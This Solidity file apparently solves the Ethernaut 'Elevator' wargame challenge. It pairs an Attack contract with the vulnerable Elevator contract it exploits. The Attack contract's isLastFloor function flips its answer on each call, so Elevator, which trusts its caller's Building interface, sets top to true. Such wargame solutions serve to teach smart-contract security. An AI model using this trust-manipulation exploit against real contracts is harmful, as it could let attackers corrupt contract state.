// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

contract Attack{
    Elevator private immutable target;
    bool manual_bool = true;

    constructor (address _target) {  
        target = Elevator(_target);
    }

    function go() external {
        target.goTo(1);
        require(target.top(), "Failed to reach top floor");
    }

    function isLastFloor(uint) external returns (bool) {
        manual_bool = !manual_bool;
        return manual_bool;
    }
}



interface Building {
  function isLastFloor(uint) external returns (bool);
}


contract Elevator {
  bool public top;
  uint public floor;

  function goTo(uint _floor) public {
    Building building = Building(msg.sender);

    if (! building.isLastFloor(_floor)) {
      floor = _floor;
      top = building.isLastFloor(floor);
    }
  }
}